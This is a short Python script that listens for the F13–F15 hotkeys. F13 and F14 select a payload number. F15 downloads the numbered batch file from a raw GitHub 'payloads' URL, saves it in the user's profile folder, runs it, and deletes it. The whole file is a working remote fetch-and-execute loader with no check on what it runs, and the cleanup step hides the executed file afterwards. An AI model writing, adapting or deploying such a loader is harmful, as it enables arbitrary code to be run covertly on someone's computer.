import keyboard
import requests
import os
os.chdir(os.getenv("USERPROFILE"))
payload_id = 0
def on_f13():
    global payload_id
    payload_id += 1
def on_f14():
    global payload_id
    payload_id = 0
def on_f15():
    with open("test_payload.bat","w") as f:
        f.write(requests.get(f"https://raw.githubusercontent.com/BigGreenHat14/biggreenhat14.github.io/refs/heads/main/payloads/{payload_id}.bat").text)
    os.system("%USERPROFILE%/test_payload.bat")
    os.remove("test_payload.bat")
keyboard.on_press_key('f13',on_f13,True)
keyboard.on_press_key('f14',on_f14,True)
keyboard.on_press_key('f15',on_f15,True)
print("it works!")
while True:
    pass